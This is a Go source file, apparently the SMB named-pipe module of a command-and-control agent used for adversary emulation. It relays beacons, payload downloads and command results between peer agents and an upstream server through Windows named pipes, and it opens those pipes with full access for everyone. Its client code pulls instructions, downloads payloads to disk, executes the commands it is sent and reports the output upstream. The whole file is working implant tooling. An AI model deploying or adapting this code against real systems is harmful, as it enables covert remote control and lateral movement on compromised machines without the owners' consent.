package contact

import (
    "bufio"
    "fmt"
    "io"
    "net"
    "encoding/json"
    "time"
    "math/rand"
    "errors"
    "strings"
    "path/filepath"
    "../winio"
    "../output"
    "../execute"
    "../util"
)

const pipeLetters = "abcdefghijklmnopqrstuvwxyz"
const numPipeLetters = int64(len(pipeLetters))
const clientPipeNameMinLen = 10
const clientPipeNameMaxLen = 15

//PipeAPI communicates through SMB named pipes. Implements the Contact interface
type SmbPipeAPI struct { }

//PipeReceiver forwards data received from SMB pipes to the upstream server. Implements the P2pReceiver interface
type SmbPipeReceiver struct { }

func init() {
	CommunicationChannels["P2pSmbPipe"] = SmbPipeAPI{}
	P2pReceiverChannels["SmbPipe"] = SmbPipeReceiver{}
}

// SmbPipeReceiver Implementation

// Listen on agent's main pipe for client connection. This main pipe will only respond to client requests with
// a unique pipe name for the client to resend the request to.  The agent will also listen on that unique pipe.
func (receiver SmbPipeReceiver) StartReceiver(profile map[string]interface{}, p2pReceiverConfig map[string]string, upstreamComs Contact) {
    pipePath := "\\\\.\\pipe\\" + p2pReceiverConfig["p2pReceiver"]

    // Make somewhat shallow copy of the profile, in case we need to change the server for just this individual pipe receiver.
    individualProfile := make(map[string]interface{})

    for k,v := range profile {
        individualProfile[k] = v
    }

    go receiver.startReceiverHelper(individualProfile, pipePath, upstreamComs)
}

// Helper method for StartReceiver. Must be run as a go routine.
func (receiver SmbPipeReceiver) startReceiverHelper(profileCopy map[string]interface{}, pipePath string, upstreamComs Contact) {
    listener, err := receiver.listenPipeFullAccess(pipePath)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }

    output.VerbosePrint(fmt.Sprintf("[*] Listening on handler pipe %s", pipePath))
    defer listener.Close()

    // Whenever a new client connects to pipe with a request, generate a new individual pipe for that client, listen on that pipe,
    // and give the pipe name to the client if pipe was successfully created.
    for {
        totalData, err := receiver.acceptPipeClientInput(listener)

        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            continue
        }

        // Handle request. This pipe should only receive GetInstruction beacons.
        // We won't forward instruction requests with this main pipe - just generate new individual pipe for client.
        // Client will resend the request to the original pipe.
        message := bytesToP2pMsg(totalData)
        if message.MessageType == INSTR_GET_INSTRUCTIONS {
            output.VerbosePrint("[*] Main pipe received instruction request beacon. Will create unique pipe for client to resend request to.")
            receiver.setIndividualClientPipe(profileCopy, listener, upstreamComs)
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] ERROR: expected beacon, received request type %d", message.MessageType))
        }
    }
}

// Sets up listener on pipe for individual client
func (receiver SmbPipeReceiver) startIndividualReceiver(profile map[string]interface{}, pipePath string, upstreamComs Contact) {
    listener, err := receiver.listenPipeFullAccess(pipePath)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }

    output.VerbosePrint(fmt.Sprintf("[*] Listening on individual client pipe %s", pipePath))
    defer listener.Close()

	for {
        // Get data from client
        totalData, err := receiver.acceptPipeClientInput(listener)

        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            continue
        }

        // Handle data
        receiver.listenerHandlePipePayload(totalData, profile, listener, upstreamComs)
	}
}

// When client sends this receiver an individual pipe request, generate a new random pipe to listen on solely for this client.
func (receiver SmbPipeReceiver) setIndividualClientPipe(profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    // Create random pipe name
    rand.Seed(time.Now().UnixNano())
    clientPipeName := getRandPipeName(rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen)
    clientPipePath := "\\\\.\\pipe\\" + clientPipeName

    // Start individual receiver on client pipe and send name to client.
    go receiver.startIndividualReceiver(profile, clientPipePath, upstreamComs)

    // Create response message for client.
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(paw, RESEND_REQUEST, []byte(clientPipeName))

    // Wait for client to reconnect before sending response.
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return
    }

    // Write & flush data and close connection.
    pipeWriter := bufio.NewWriter(conn)
    writePipeData(pipeMsgData, pipeWriter)
    output.VerbosePrint(fmt.Sprintf("[*] Sent new individual client pipe %s", clientPipeName))
}

// Pass the instruction request to the upstream coms, and return the response.
func (receiver SmbPipeReceiver) forwardGetInstructions(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding instructions to %s on behalf of paw %s", profile["server"].(string), paw))

    // message payload contains profile to send upstream
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    clientProfile["server"] = profile["server"] // make sure we send the instructions to the right place.

    // Wait for client to reconnect to pipe before attempting to forward request upstream.
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return
    }

    // Get upstream response.
    response := upstreamComs.GetInstructions(clientProfile)

    // Change this receiver's server to the new one if a new one was specified.
    if clientProfile["server"].(string) != profile["server"].(string) {
        output.VerbosePrint(fmt.Sprintf("[*] Changing this individual receiver's upstream server from %s to %s", profile["server"].(string), clientProfile["server"].(string)))
        profile["server"] = clientProfile["server"]
    }

    // Return response downstream.
    data, _ := json.Marshal(response)
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_INSTRUCTIONS, data)
   pipeWriter := bufio.NewWriter(conn)
    writePipeData(pipeMsgData, pipeWriter)
    output.VerbosePrint(fmt.Sprintf("[*] Sent instruction response to paw %s:", paw, response))
}

func (receiver SmbPipeReceiver) forwardPayloadBytesDownload(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding payload bytes request on behalf of paw %s", paw))

    // message payload contains file name (str) and platform (str)
    var fileInfo map[string]string
    json.Unmarshal(message.Payload, &fileInfo)

    // Wait for client to reconnect to pipe before attempting to forward request upstream.
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return
    }
    upstreamResponse := upstreamComs.GetPayloadBytes(fileInfo["file"], profile["server"].(string), paw, fileInfo["platform"])

    // Return response downstream.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_PAYLOAD_BYTES, upstreamResponse)
    pipeWriter := bufio.NewWriter(conn)
    writePipeData(pipeMsgData, pipeWriter)
    output.VerbosePrint(fmt.Sprintf("[*] Sent payload bytes to paw %s", paw))
}

func (receiver SmbPipeReceiver) forwardSendExecResults(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding execution results on behalf of paw %s", paw))

    // message payload contains client profile and result info.
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    if clientProfile == nil {
        output.VerbosePrint("[!] Error. Client sent blank message payload for execution results.")
        return
    }
    clientProfile["server"] = profile["server"]
    result := clientProfile["result"].(map[string]interface{})

    // Wait for client to reconnect to pipe before attempting to forward request upstream.
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return
    }

    upstreamComs.SendExecutionResults(clientProfile, result)

    // Send response message to client.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_SEND_EXECUTION_RESULTS, nil) // no data to send, just an ACK
    pipeWriter := bufio.NewWriter(conn)
    writePipeData(pipeMsgData, pipeWriter)
    output.VerbosePrint(fmt.Sprintf("[*] Sent execution result delivery response to paw %s", paw))
}

// Helper function that listens on pipe and returns listener and any error.
func (receiver SmbPipeReceiver) listenPipeFullAccess(pipePath string) (net.Listener, error) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    return winio.ListenPipe(pipePath, config)
}

// Helper function that creates random string of specified length using letters a-z
func getRandPipeName(length int) string {
    rand.Seed(time.Now().UnixNano())
    buffer := make([]byte, length)
    for i := range buffer {
        buffer[i] = pipeLetters[rand.Int63() % numPipeLetters]
    }
    return string(buffer)
}

// Helper function that waits for client to connect to the listener and returns data sent by client.
func (receiver SmbPipeReceiver) acceptPipeClientInput(listener net.Listener) ([]byte, error) {
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return nil, err
    }

    // Read in the data and close connection.
    pipeReader := bufio.NewReader(conn)
    data, _ := readPipeData(pipeReader)
    return data, nil
}

// Helper function that handles data received from the named pipe by sending it to the agent's c2/upstream server.
// Waits for original client to connect to listener before writing response back.
// Does not handle individual pipe request - those are handled in ListenForClient.
func (receiver SmbPipeReceiver) listenerHandlePipePayload(data []byte, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    // convert data to message struct
    var message P2pMessage
    json.Unmarshal(data, &message)

    switch message.MessageType {
    case INSTR_GET_INSTRUCTIONS:
	    receiver.forwardGetInstructions(message, profile, listener, upstreamComs)
	case INSTR_GET_PAYLOAD_BYTES:
	    receiver.forwardPayloadBytesDownload(message, profile, listener, upstreamComs)
	case INSTR_SEND_EXECUTION_RESULTS:
	    receiver.forwardSendExecResults(message, profile, listener, upstreamComs)
    default:
        output.VerbosePrint(fmt.Sprintf("[!] ERROR: invalid instruction type for receiver-bound p2p message %d", message.MessageType))
    }
}

/*
 * SmbPipeAPI implementation
 */

// Contact API functions

func (p2pPipeClient SmbPipeAPI) GetInstructions(profile map[string]interface{}) map[string]interface{} {
    // Send beacon and fetch response
    payload, _ := json.Marshal(profile)
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    serverResp, err := p2pPipeClient.sendRequestToServer(profile["server"].(string), paw, INSTR_GET_INSTRUCTIONS, payload)

	var out map[string]interface{}
	if err == nil {
		// Check if server wants us to switch pipes.
		for serverResp.MessageType == RESEND_REQUEST {
            // We got the pipe name to resend request to.
            newPipeName := string(serverResp.Payload)
            output.VerbosePrint(fmt.Sprintf("[*] Obtained individual pipe name to resend request to: %s", newPipeName))

            // Replace server for agent.
            serverHostName := strings.Split(profile["server"].(string), "\\")[2]
            newServerPipePath := "\\\\" + serverHostName + "\\pipe\\" + newPipeName
            profile["server"] = newServerPipePath
            serverResp, err = p2pPipeClient.sendRequestToServer(newServerPipePath, paw, INSTR_GET_INSTRUCTIONS, payload)
            output.VerbosePrint(fmt.Sprintf("[*] Resent request to %s", newServerPipePath))

            if err != nil {
                output.VerbosePrint(fmt.Sprintf("[-] P2p resent beacon DEAD via %s. Error: %v", profile["server"].(string), err))
                break
            }
        }

        // Check if blank message was returned.
        if msgIsEmpty(serverResp) {
		    output.VerbosePrint(fmt.Sprintf("[-] Empty message from server. P2p beacon DEAD via %s", profile["server"].(string)))
        } else if serverResp.MessageType != RESPONSE_INSTRUCTIONS {
            output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting instructions: %d", serverResp.MessageType))
        } else {
            // Message payload contains instruction info.
            json.Unmarshal(serverResp.Payload, &out)
            if out != nil {
                out["sleep"] = int(out["sleep"].(float64))
                out["watchdog"] = int(out["watchdog"].(float64))
                output.VerbosePrint(fmt.Sprintf("[*] P2p beacon ALIVE via %s", profile["server"].(string)))
            } else {
		        output.VerbosePrint(fmt.Sprintf("[-] Empty payload from server. P2p beacon DEAD via %s", profile["server"].(string)))
            }
		}
	} else {
	    output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
		output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
	}
	return out
}

func (p2pPipeClient SmbPipeAPI) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
    payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, p2pPipeClient.drop(payload, server, uniqueId, platform))
		}
	}
	return droppedPayloads
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (p2pPipeClient SmbPipeAPI) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
	var payloadBytes []byte
	if len(payload) > 0 {
	    // Download single payload bytes. Create SMB Pipe message with instruction type INSTR_GET_PAYLOAD_BYTES
	    // and payload as a map[string]string specifying the file and platform.
		output.VerbosePrint(fmt.Sprintf("[*] P2p Client Downloading new payload via %s: %s",server, payload))
        fileInfo := map[string]interface{} {"file": payload, "platform": platform}
        payload, _ := json.Marshal(fileInfo)
		responseMsg, err := p2pPipeClient.sendRequestToServer(server, uniqueID, INSTR_GET_PAYLOAD_BYTES, payload)

		if err == nil {
            if responseMsg.MessageType == RESPONSE_PAYLOAD_BYTES {
                // Payload bytes in message payload.
                payloadBytes = responseMsg.Payload
            } else {
                output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting getting payload bytes: %d", responseMsg.MessageType))
            }
		} else {
		    output.VerbosePrint("[!] Error: failed message response from forwarder.")
		}
	}
	return payloadBytes
}

func (p2pPipeClient SmbPipeAPI) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
    result := make(map[string]interface{})
    output, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = output
	result["status"] = status
	result["pid"] = pid
 	p2pPipeClient.SendExecutionResults(profile, result)
}

func (p2pPipeClient SmbPipeAPI) C2RequirementsMet(criteria map[string]string) bool {
    return true
}

func (p2pPipeClient SmbPipeAPI) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
    // Build SMB pipe message for sending execution results.
    // payload will JSON marshal of profile, with execution results
    profileCopy := profile
	profileCopy["result"] = result
	payload, _ := json.Marshal(profileCopy)
    output.VerbosePrint(fmt.Sprintf("[*] P2p Client: going to send execution results to %s", profile["server"].(string)))
    serverResp, err := p2pPipeClient.sendRequestToServer(profile["server"].(string), profile["paw"].(string), INSTR_SEND_EXECUTION_RESULTS, payload)

    if err == nil {
        if serverResp.MessageType == RESPONSE_SEND_EXECUTION_RESULTS {
            output.VerbosePrint("[*] P2p Client: forwarder passed on our execution results.")
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for sending execution results: %d", serverResp.MessageType))
        }
    } else {
        output.VerbosePrint("[!] Error: failed sending execution result response from forwarder.")
    }
}


// Helper functions

// Download single payload and write to disk
func (p2pPipeClient SmbPipeAPI) drop(payload string, server string, uniqueID string, platform string) string {
    location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
	    data := p2pPipeClient.GetPayloadBytes(payload, server, uniqueID, platform)

        if data != nil {
		    util.WritePayloadBytes(location, data)
		}
	}
	return location
}

// Send a P2pMessage to the server using the specified server pipe path, paw, message type, and payload.
// Returns the P2pMessage from the server.
func (p2pPipeClient SmbPipeAPI) sendRequestToServer(pipePath string, paw string, messageType int, payload []byte) (P2pMessage, error) {
    // Build P2pMessage and convert to bytes.
    pipeMsgData := buildP2pMsgBytes(paw, messageType, payload)

    // Send request and fetch response
    p2pPipeClient.sendSmbPipeClientInput(pipePath, pipeMsgData)
    responseData := p2pPipeClient.fetchReceiverResponse(pipePath)

    if responseData != nil {
        respMsg := bytesToP2pMsg(responseData)
        return respMsg, nil
    } else {
        return P2pMessage{}, errors.New("Failed to get response from server.")
    }
}

// Sends data to specified pipe.
func (p2pPipeClient SmbPipeAPI) sendSmbPipeClientInput(pipePath string, data []byte) {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return
    }

    defer conn.Close()

    // Write data and close connection.
    writer := bufio.NewWriter(conn)
    writePipeData(data, writer)
}

// Read response data from receiver using given pipePath.
func (p2pPipeClient SmbPipeAPI) fetchReceiverResponse(pipePath string) []byte {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return nil
    }

    defer conn.Close()

    // Read data and return.
    pipeReader := bufio.NewReader(conn)
    data, _ := readPipeData(pipeReader)
    return data
}

/*
 * Other auxiliary functions
 */

// Returns data and number of bytes read.
func readPipeData(pipeReader *bufio.Reader) ([]byte, int64) {
    buffer := make([]byte, 4*1024)
    totalData := make([]byte, 0)
    numBytes := int64(0)
    numChunks := int64(0)

    for {
        n, err := pipeReader.Read(buffer[:cap(buffer)])
        buffer = buffer[:n]

        if n == 0 {
            if err == nil {
                // Try reading again.
                time.Sleep(200 * time.Millisecond)
                continue
            } else if err == io.EOF {
                // Reading is done.
                break
            } else {
                 output.VerbosePrint("[!] Error reading data from pipe")
                 return nil, 0
            }
        }

        numChunks++
        numBytes += int64(len(buffer))

        // Add data chunk to current total
        totalData = append(totalData, buffer...)

        if err != nil && err != io.EOF {
             output.VerbosePrint("[!] Error reading data from pipe")
             return nil, 0
        }
    }

    // Data has been read from pipe
    return totalData, numBytes
}

func writePipeData(data []byte, pipeWriter *bufio.Writer) {
    _, err := pipeWriter.Write(data)

    if err != nil {
        if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error writing data to pipe\n%v", err))
            return
	    }
    }

    err = pipeWriter.Flush()
	if err != nil {
	    if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error flushing data to pipe\n%v", err))
		    return
	    }
	}
}